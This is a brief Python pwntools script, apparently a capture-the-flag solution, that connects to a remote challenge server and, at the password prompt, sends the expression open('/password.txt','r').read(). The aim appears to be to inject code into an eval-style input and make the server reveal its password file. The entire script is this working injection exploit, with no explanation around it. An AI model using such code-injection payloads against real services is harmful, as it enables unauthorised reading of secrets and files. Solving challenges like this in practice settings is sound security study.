from pwn import *

# context.log_level = "debug"

p = remote("pwn.server.io", 31137)


p.sendlineafter(b"What's the password? ", b'open("/password.txt", "r").read()')

print(p.recv())